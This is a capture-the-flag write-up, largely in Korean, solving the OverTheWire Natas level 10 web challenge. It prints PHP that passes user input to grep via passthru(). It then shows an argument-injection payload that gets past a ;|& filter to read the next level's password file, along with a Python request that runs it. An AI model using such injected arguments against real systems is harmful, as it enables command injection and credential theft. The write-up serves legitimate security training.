# Category

web

# Overview

For security reasons, we now filter on certain characters

Find words containing:

Output:

# Analysis

- `view sourcecode`를 확인한 결과 아래와 같이 php코드가 있었으며, 사용자가 입력한 `needle`의 `value`를 시스템 내에서 `grep`를 이용하여 일치하는 값을 찾는 명령어으로 사용자가 의도하지않은 입력값을 통해 시스템 내의 다른 내용을 볼 수 있는 취약점이 존재한다.
- 이전 레벨과 동일한 상황에서 정규표현식을 통해 `;, &`를 막으면서 사용할 수 있는 제한을 두었다.

```php
<?
$key = "";

if(array_key_exists("needle", $_REQUEST)) {
    $key = $_REQUEST["needle"];
}

if($key != "") {
    if(preg_match('/[;|&]/',$key)) {
        print "Input contains an illegal character!";
    } else {
        passthru("grep -i $key dictionary.txt");
    }
}
?>
```

# Exploitation

`grep -i -E '.' /etc/natas_webpass/natas11 dictionary.txt` 와 같이 정규표현식 제한 `;|&`를 우회하면서 정규표현식을 추가한 `-E '.'` 옵션을 이용해 비밀번호가 있는 파일을 `dictionary.txt`와 같이 열어 값을 확인할 수 있다.

```python
# full exploitation solve.py
res = req(
  method="GET",
  url="http://natas10.natas.labs.overthewire.org/?needle=-E '.' /etc/natas_webpass/natas11&submit=Search",
  auth=("natas10", "t7...Ou")
)
```

# Flag

`UJ...Ek`
